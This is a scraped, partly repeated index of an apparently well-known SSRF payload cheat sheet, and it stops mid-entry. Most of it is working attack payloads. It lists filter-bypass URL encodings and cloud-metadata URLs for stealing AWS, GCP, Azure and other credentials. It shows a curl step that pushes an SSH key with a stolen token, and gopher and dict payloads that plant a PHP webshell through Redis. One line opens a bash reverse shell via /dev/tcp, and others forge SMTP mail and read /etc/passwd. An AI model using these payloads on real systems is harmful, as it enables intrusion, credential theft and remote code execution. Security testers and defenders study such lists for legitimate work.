https://github.com/assetnote/blind-ssrf-chains Possible via HTTP(s) - Elasticsearch - Weblogic - Hashicorp Consul - Shellshock - Apache Druid - Apache Solr - PeopleSoft - Apache Struts - JBoss - Confluence - Jira - Other Atlassian Products - OpenTSDB - Jenkins - Hystrix Dashboard - W3 Total Cache - Docker - Gitlab Prometheus Redis Exporter Possible via Gopher - Redis - Memcache - Apache Tomcat SSRF to XSS by @D0rkerDevil & @alyssa.o.herrera http://brutelogic.com.br/poc.svg -> simple alert https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg SSRF from XSS Using an iframe The content of the file will be integrated inside the PDF as an image or text. <img src=\"echopwn\" onerror=\"document.write('<iframe src=file:///etc/passwd></iframe>')\"/> Using an attachment Example of a PDF attachment using HTML use <link rel=attachment href=\"URL\"> as Bio text use 'Download Data' feature to get PDF use pdfdetach -saveall filename.pdf to extract embedded resource cat attachment.bin SSRF URL for Cloud Instances SSRF URL for AWS Bucket Docs Interesting path to look for at http://169.254.169.254 or http://instance-data Always here : /latest/meta-data/{hostname,public-ipv4,...} User data (startup script for auto-scaling) : /latest/user-data Temporary AWS credentials : /latest/meta-data/iam/security-credentials/ DNS record http://instance-data http://169.254.169.254 http://169.254.169.254.nip.io/ HTTP redirect Static:http://nicob.net/redir6a Dynamic:http://nicob.net/redir-http-169.254.169.254:80- Alternate IP encoding http://425.510.425.510/ Dotted decimal with overflow http://2852039166/ Dotless decimal http://7147006462/ Dotless decimal with overflow http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal http://0xA9FEA9FE/ Dotless hexadecimal http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow http://0251.0376.0251.0376/ Dotted octal http://0251.00376.000251.0000376/ Dotted octal with padding More urls to include http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/ http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access http://169.254.169.254/latest/dynamic/instance-identity/document AWS SSRF Bypasses Converted Decimal IP: http://2852039166/latest/meta-data/ IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/ IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/ IPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/ E.g: Jira SSRF leading to AWS info disclosure - https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance E.g2: Flaws challenge - http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/ SSRF URL for AWS ECS If you have an SSRF with file system access on an ECS instance, try extracting /proc/self/environ to get UUID. curl http://169.254.170.2/v2/credentials/<UUID> This way you'll extract IAM keys of the attached role SSRF URL for AWS Elastic Beanstalk We retrieve the accountId and region from the API. http://169.254.169.254/latest/dynamic/instance-identity/document http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role We then retrieve the AccessKeyId , SecretAccessKey , and Token from the API. http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role Then we use the credentials with aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/ . SSRF URL for AWS Lambda AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment. http://localhost:9001/2018-06-01/runtime/invocation/next $ curl \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\" Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next SSRF URL for Google Cloud :warning: Google is shutting down support for usage of the v1 metadata service on January 15. Requires the header \"Metadata-Flavor: Google\" or \"X-Google-Metadata-Request: True\" http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id Google allows recursive pulls http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn) http://metadata.google.internal/computeMetadata/v1beta1/ http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true Required headers can be set using a gopher SSRF with the following technique gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a Interesting files to pull out: SSH Public Key : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json Get Access Token : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token Kubernetes Key : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json Add an SSH key Extract the token http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json Check the scope of the token $ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA { \"issued_to\": \"101302079XXXXX\", \"audience\": \"10130207XXXXX\", \"scope\": \"https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring\", \"expires_in\": 2443, \"access_type\": \"offline\" } Now push the SSH key. curl -X POST \"https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\" -H \"Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA\" -H \"Content-Type: application/json\" --data '{\"items\": [{\"key\": \"sshkeyname\", \"value\": \"sshkeyvalue\"}]}' SSRF URL for Digital Ocean Documentation available at https://developers.digitalocean.com/documentation/metadata/ curl http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address All in one request: curl http://169.254.169.254/metadata/v1.json | jq SSRF URL for Packetcloud Documentation available at https://metadata.packet.net/userdata SSRF URL for Azure Limited, maybe more exists? https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/ http://169.254.169.254/metadata/v1/maintenance Update Apr 2017, Azure has more support; requires the header \"Metadata: true\" https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service http://169.254.169.254/metadata/instance?api-version=2017-04-02 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text SSRF URL for OpenStack/RackSpace (header required? unknown) http://169.254.169.254/openstack SSRF URL for HP Helion (header required? unknown) http://169.254.169.254/2009-04-04/meta-data/ SSRF URL for Oracle Cloud http://192.0.0.192/latest/ http://192.0.0.192/latest/user-data/ http://192.0.0.192/latest/meta-data/ http://192.0.0.192/latest/attributes/ SSRF URL for Alibaba http://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id SSRF URL for Kubernetes ETCD Can contain API keys and internal ip and ports curl -L http://127.0.0.1:2379/version curl http://127.0.0.1:2379/v2/keys/?recursive=true SSRF URL for Docker http://127.0.0.1:2375/v1.24/containers/json Simple example docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json More info: Daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option Docker Engine API: https://docs.docker.com/engine/api/latest/ SSRF URL for Rancher curl http://rancher-metadata/<version>/<path> More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/ References AppSecEU15-Server_side_browsing_considered_harmful.pdf Extracting AWS metadata via SSRF in Google Acquisition - tghawkins - 2017-12-13 ESEA Server-Side Request Forgery and Querying AWS Meta Data by Brett Buerhaus SSRF and local file read in video to gif converter SSRF in https://imgur.com/vidgif/url SSRF in proxy.duckduckgo.com Blind SSRF on errors.hackerone.net SSRF on *shopifycloud.com Hackerone - How To: Server-Side Request Forgery (SSRF) Awesome URL abuse for SSRF by @orange_8361 #BHUSA How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai #HITBGSEC 2017 SG Conf D1 - A New Era Of SSRF - Exploiting Url Parsers - Orange Tsai SSRF Tips - xl7dev SSRF in https://imgur.com/vidgif/url Les Server Side Request Forgery : Comment contourner un pare-feu - @Geluchat AppSecEU15 Server side browsing considered harmful - @Agarri Enclosed alphanumerics - @EdOverflow Hacking the Hackers: Leveraging an SSRF in HackerTarget - @sxcurity PHP SSRF @secjuice How I convert SSRF to xss in a ssrf vulnerable Jira Piercing the Veil: Server Side Request Forgery to NIPRNet access Hacker101 SSRF SSRF\u8106\u5f31\u6027\u3092\u5229\u7528\u3057\u305fGCE/GKE\u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u3078\u306e\u653b\u6483\u4f8b SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019 SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure PortSwigger - Web Security Academy Server-side request forgery (SSRF) SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019 SSRF\u2019s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019 challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE! Attacking Url's in JAVA","title":"Server-Side Request Forgery"},{"location":"Server%20Side%20Request%20Forgery/#server-side-request-forgery","text":"Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.","title":"Server-Side Request Forgery"},{"location":"Server%20Side%20Request%20Forgery/#summary","text":"Tools Payloads with localhost Bypassing filters Bypass using HTTPS Bypass localhost with [::] Bypass localhost with a domain redirection Bypass localhost with CIDR Bypass using a decimal IP location Bypass using octal IP Bypass using IPv6/IPv4 Address Embedding Bypass using malformed urls Bypass using rare address Bypass using URL encoding Bypass using bash variables Bypass using tricks combination Bypass using enclosed alphanumerics Bypass filter_var() php function Bypass against a weak parser Bypassing using jar protocol (java only) SSRF exploitation via URL Scheme file:// http:// dict:// sftp:// tftp:// ldap:// gopher:// netdoc:// SSRF exploiting WSGI SSRF exploiting Redis SSRF exploiting PDF file Blind SSRF SSRF to XSS SSRF from XSS SSRF URL for Cloud Instances SSRF URL for AWS Bucket SSRF URL for AWS ECS SSRF URL for AWS Elastic Beanstalk SSRF URL for AWS Lambda SSRF URL for Google Cloud SSRF URL for Digital Ocean SSRF URL for Packetcloud SSRF URL for Azure SSRF URL for OpenStack/RackSpace SSRF URL for HP Helion SSRF URL for Oracle Cloud SSRF URL for Kubernetes ETCD SSRF URL for Alibaba SSRF URL for Docker SSRF URL for Rancher","title":"Summary"},{"location":"Server%20Side%20Request%20Forgery/#tools","text":"SSRFmap - https://github.com/swisskyrepo/SSRFmap Gopherus - https://github.com/tarunkant/Gopherus See-SURF - https://github.com/In3tinct/See-SURF SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff","title":"Tools"},{"location":"Server%20Side%20Request%20Forgery/#payloads-with-localhost","text":"Basic SSRF v1 http://127.0.0.1:80 http://127.0.0.1:443 http://127.0.0.1:22 http://0.0.0.0:80 http://0.0.0.0:443 http://0.0.0.0:22 Basic SSRF - Alternative version http://localhost:80 http://localhost:443 http://localhost:22","title":"Payloads with localhost"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-filters","text":"","title":"Bypassing filters"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-https","text":"https://127.0.0.1/ https://localhost/","title":"Bypass using HTTPS"},{"location":"Server%20Side%20Request%20Forgery/#bypass-localhost-with","text":"http://[::]:80/ http://[::]:25/ SMTP http://[::]:22/ SSH http://[::]:3128/ Squid http://0000::1:80/ http://0000::1:25/ SMTP http://0000::1:22/ SSH http://0000::1:3128/ Squid","title":"Bypass localhost with [::]"},{"location":"Server%20Side%20Request%20Forgery/#bypass-localhost-with-a-domain-redirection","text":"http://spoofed.burpcollaborator.net http://localtest.me http://customer1.app.localhost.my.company.127.0.0.1.nip.io http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost http://bugbounty.dod.network redirect to 127.0.0.2 == localhost The service nip.io is awesome for that, it will convert any ip address as a dns. NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1","title":"Bypass localhost with a domain redirection"},{"location":"Server%20Side%20Request%20Forgery/#bypass-localhost-with-cidr","text":"It's a /8 http://127.127.127.127 http://127.0.1.3 http://127.0.0.0","title":"Bypass localhost with CIDR"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-a-decimal-ip-location","text":"http://2130706433/ = http://127.0.0.1 http://3232235521/ = http://192.168.0.1 http://3232235777/ = http://192.168.1.1 http://2852039166/ = http://169.254.169.254","title":"Bypass using a decimal IP location"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-octal-ip","text":"Implementations differ on how to handle octal format of ipv4. http://0177.0.0.1/ = http://127.0.0.1 http://o177.0.0.1/ = http://127.0.0.1 http://0o177.0.0.1/ = http://127.0.0.1 http://q177.0.0.1/ = http://127.0.0.1 ... Ref: - DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards & pwning IPv4 parsing - AppSecEU15-Server_side_browsing_considered_harmful.pdf","title":"Bypass using octal IP"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-ipv6ipv4-address-embedding","text":"IPv6/IPv4 Address Embedding http://[0:0:0:0:0:ffff:127.0.0.1]","title":"Bypass using IPv6/IPv4 Address Embedding"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-malformed-urls","text":"localhost:+11211aaa localhost:00011211aaaa","title":"Bypass using malformed urls"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-rare-address","text":"You can short-hand IP addresses by dropping the zeros http://0/ http://127.1 http://127.0.1","title":"Bypass using rare address"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-url-encoding","text":"Single or double encode a specific URL to bypass blacklist http://127.0.0.1/%61dmin http://127.0.0.1/%2561dmin","title":"Bypass using URL encoding"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-bash-variables","text":"(curl only) curl -v \"http://evil$google.com\" $google = \"\"","title":"Bypass using bash variables"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-tricks-combination","text":"http://1.1.1.1 &@2.2.2.2# @3.3.3.3/ urllib2 : 1.1.1.1 requests + browsers : 2.2.2.2 urllib : 3.3.3.3","title":"Bypass using tricks combination"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-enclosed-alphanumerics","text":"@EdOverflow http://\u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc = example.com List: \u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \u2488 \u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd \u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff","title":"Bypass using enclosed alphanumerics"},{"location":"Server%20Side%20Request%20Forgery/#bypass-using-unicode","text":"In some languages (.NET, Python 3) regex supports unicode by default. \\d includes 0123456789 but also \u0e50\u0e51\u0e52\u0e53\u0e54\u0e55\u0e56\u0e57\u0e58\u0e59 .","title":"Bypass using unicode"},{"location":"Server%20Side%20Request%20Forgery/#bypass-filter_var-php-function","text":"0://evil.com:80;http://google.com:80/","title":"Bypass filter_var() php function"},{"location":"Server%20Side%20Request%20Forgery/#bypass-against-a-weak-parser","text":"by Orange Tsai ( Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf ) http://127.1.1.1:80\\@127.2.2.2:80/ http://127.1.1.1:80\\@@127.2.2.2:80/ http://127.1.1.1:80:\\@@127.2.2.2:80/ http://127.1.1.1:80#\\@127.2.2.2:80/","title":"Bypass against a weak parser"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-using-a-redirect","text":"using a redirect 1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1) 2. Launch the SSRF pointing to vulnerable.com/index.php?url=http://YOUR_SERVER_IP vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1 3. You can use response codes [307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.","title":"Bypassing using a redirect"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-using-typeurl","text":"Change \"type=file\" to \"type=url\" Paste URL in text field and hit enter Using this vulnerability users can upload images from any image URL = trigger an SSRF","title":"Bypassing using type=url"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-using-dns-rebinding-toctou","text":"Create a domain that change between two IPs. http://1u.ms/ exists for this purpose. For example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain: make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms","title":"Bypassing using DNS Rebinding (TOCTOU)"},{"location":"Server%20Side%20Request%20Forgery/#bypassing-using-jar-protocol-java-only","text":"Blind SSRF jar:scheme://domain/path!/ jar:http://127.0.0.1!/ jar:https://127.0.0.1!/ jar:ftp://127.0.0.1!/","title":"Bypassing using jar protocol (java only)"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-exploitation-via-url-scheme","text":"","title":"SSRF exploitation via URL Scheme"},{"location":"Server%20Side%20Request%20Forgery/#file","text":"Allows an attacker to fetch the content of a file on the server file://path/to/file file:///etc/passwd file://\\/\\/etc/passwd ssrf.php?url=file:///etc/passwd","title":"File"},{"location":"Server%20Side%20Request%20Forgery/#http","text":"Allows an attacker to fetch any content from the web, it can also be used to scan ports. ssrf.php?url=http://127.0.0.1:22 ssrf.php?url=http://127.0.0.1:80 ssrf.php?url=http://127.0.0.1:443 The following URL scheme can be used to probe the network","title":"HTTP"},{"location":"Server%20Side%20Request%20Forgery/#dict","text":"The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol: dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n> ssrf.php?url=dict://attacker:11111/","title":"Dict"},{"location":"Server%20Side%20Request%20Forgery/#sftp","text":"A network protocol used for secure file transfer over secure shell ssrf.php?url=sftp://evil.com:11111/","title":"SFTP"},{"location":"Server%20Side%20Request%20Forgery/#tftp","text":"Trivial File Transfer Protocol, works over UDP ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET","title":"TFTP"},{"location":"Server%20Side%20Request%20Forgery/#ldap","text":"Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service. ssrf.php?url=ldap://localhost:11211/%0astats%0aquit","title":"LDAP"},{"location":"Server%20Side%20Request%20Forgery/#gopher","text":"ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a will make a request like HELO localhost MAIL FROM:<hacker@site.com> RCPT TO:<victim@site.com> DATA From: [Hacker] <hacker@site.com> To: <victime@site.com> Date: Tue, 15 Sep 2017 17:20:26 -0400 Subject: Ah Ah AH You didn't say the magic word ! . QUIT","title":"Gopher"},{"location":"Server%20Side%20Request%20Forgery/#gopher-http","text":"gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body","title":"Gopher HTTP"},{"location":"Server%20Side%20Request%20Forgery/#gopher-smtp-back-connect-to-1337","text":"Content of evil.com/redirect.php: <?php header(\"Location: gopher://hack3r.site:1337/_SSRF%0ATest!\"); ?> Now query it. https://example.com/?q=http://evil.com/redirect.php.","title":"Gopher SMTP - Back connect to 1337"},{"location":"Server%20Side%20Request%20Forgery/#gopher-smtp-send-a-mail","text":"Content of evil.com/redirect.php: <?php $commands = array( 'HELO victim.com', 'MAIL FROM: <admin@victim.com>', 'RCPT To: <sxcurity@oou.us>', 'DATA', 'Subject: @sxcurity!', 'Corben was here, woot woot!', '.' ); $payload = implode('%0A', $commands); header('Location: gopher://0:25/_'.$payload); ?>","title":"Gopher SMTP - send a mail"},{"location":"Server%20Side%20Request%20Forgery/#netdoc","text":"Wrapper for Java when your payloads struggle with \"\\n\" and \"\\r\" characters. ssrf.php?url=netdoc:///etc/passwd","title":"Netdoc"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-exploiting-wsgi","text":"Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py. gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py Header modifier1 (1 byte) 0 (%00) datasize (2 bytes) 26 (%1A%00) modifier2 (1 byte) 0 (%00) Variable (UWSGI_FILE) key length (2 bytes) 10 (%0A%00) key data (m bytes) UWSGI_FILE value length (2 bytes) 12 (%0C%00) value data (n bytes) /tmp/test.py","title":"SSRF exploiting WSGI"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-exploiting-redis","text":"Redis is a database system that stores everything in RAM # Getting a webshell url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php url=dict://127.0.0.1:6379/SET%20mykey%20\"<\\x3Fphp system($_GET[0])\\x3F>\" url=dict://127.0.0.1:6379/SAVE # Getting a PHP reverse shell gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22 gopher://127.0.0.1:6379/_save","title":"SSRF exploiting Redis"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-exploiting-pdf-file","text":"Example with WeasyPrint by @nahamsec <link rel=attachment href=\"file:///root/secret.txt\"> Example with PhantomJS <script> exfil = new XMLHttpRequest(); exfil.open(\"GET\",\"file:///etc/passwd\"); exfil.send(); exfil.onload = function(){document.write(this.responseText);} exfil.onerror = function(){document.write('failed!')} </script>","title":"SSRF exploiting PDF file"},{"location":"Server%20Side%20Request%20Forgery/#blind-ssrf","text":"When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. Use an SSRF chain to gain an Out-of-Band output. From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.com/assetnote/blind-ssrf-chains Possible via HTTP(s) - Elasticsearch - Weblogic - Hashicorp Consul - Shellshock - Apache Druid - Apache Solr - PeopleSoft - Apache Struts - JBoss - Confluence - Jira - Other Atlassian Products - OpenTSDB - Jenkins - Hystrix Dashboard - W3 Total Cache - Docker - Gitlab Prometheus Redis Exporter Possible via Gopher - Redis - Memcache - Apache Tomcat","title":"Blind SSRF"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-to-xss","text":"by @D0rkerDevil & @alyssa.o.herrera http://brutelogic.com.br/poc.svg -> simple alert https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg","title":"SSRF to XSS"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-from-xss","text":"","title":"SSRF from XSS"},{"location":"Server%20Side%20Request%20Forgery/#using-an-iframe","text":"The content of the file will be integrated inside the PDF as an image or text. <img src=\"echopwn\" onerror=\"document.write('<iframe src=file:///etc/passwd></iframe>')\"/>","title":"Using an iframe"},{"location":"Server%20Side%20Request%20Forgery/#using-an-attachment","text":"Example of a PDF attachment using HTML use <link rel=attachment href=\"URL\"> as Bio text use 'Download Data' feature to get PDF use pdfdetach -saveall filename.pdf to extract embedded resource cat attachment.bin","title":"Using an attachment"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-cloud-instances","text":"","title":"SSRF URL for Cloud Instances"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-aws-bucket","text":"Docs Interesting path to look for at http://169.254.169.254 or http://instance-data Always here : /latest/meta-data/{hostname,public-ipv4,...} User data (startup script for auto-scaling) : /latest/user-data Temporary AWS credentials : /latest/meta-data/iam/security-credentials/ DNS record http://instance-data http://169.254.169.254 http://169.254.169.254.nip.io/ HTTP redirect Static:http://nicob.net/redir6a Dynamic:http://nicob.net/redir-http-169.254.169.254:80- Alternate IP encoding http://425.510.425.510/ Dotted decimal with overflow http://2852039166/ Dotless decimal http://7147006462/ Dotless decimal with overflow http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal http://0xA9FEA9FE/ Dotless hexadecimal http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow http://0251.0376.0251.0376/ Dotted octal http://0251.00376.000251.0000376/ Dotted octal with padding More urls to include http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/ http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access http://169.254.169.254/latest/dynamic/instance-identity/document AWS SSRF Bypasses Converted Decimal IP: http://2852039166/latest/meta-data/ IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/ IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/ IPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/ E.g: Jira SSRF leading to AWS info disclosure - https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance E.g2: Flaws challenge - http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/","title":"SSRF URL for AWS Bucket"},{"location":"Server%20Side%20Request%20Forgery/#ssrf-url-for-aws-ecs","text":"If you have an SSRF with file system access on an ECS instance, try extracting /proc/self/environ to get UUID. curl http://169.254.170.2/v2/credentials/<UUID> This way you'll extract IAM keys of the attached role","title":"SSRF URL for AWS 